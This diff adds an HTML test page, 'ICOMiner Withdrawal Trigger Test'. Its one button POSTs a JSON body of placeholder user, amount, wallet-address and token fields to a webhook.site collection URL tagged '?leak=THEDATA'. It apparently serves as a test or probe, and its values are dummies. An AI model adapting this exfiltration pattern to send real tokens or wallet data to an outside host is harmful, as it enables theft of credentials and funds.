@@ -1,0 +1,58 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ICOMiner Withdrawal Test</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 2em;
+      background: #111;
+      color: #0f0;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 1.2em;
+      background: #0f0;
+      color: #000;
+      border: none;
+      cursor: pointer;
+    }
+    pre {
+      background: #222;
+      padding: 1em;
+      margin-top: 1em;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>
+  <h1>ICOMiner Withdrawal Trigger Test</h1>
+  <button onclick="triggerWithdrawal()">Attempt Withdrawal</button>
+  <pre id="response">Waiting for request...</pre>  <script>
+    async function triggerWithdrawal() {
+      document.getElementById('response').textContent = 'Sending request...';
+
+      const payload = {
+        user_id: "test_user",
+        amount: "100",
+        wallet_address: "TRXxxxxxxxxxxx",
+        token: "test_token"
+      };
+
+      try {
+        const res = await fetch("https://webhook.site/846de35d-2625-497d-8ab8-414d516ccb49?leak=THEDATA", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const result = await res.text();
+        document.getElementById('response').textContent = result;
+      } catch (err) {
+        document.getElementById('response').textContent = 'Error: ' + err;
+      }
+    }
+  </script></body>
+</html>
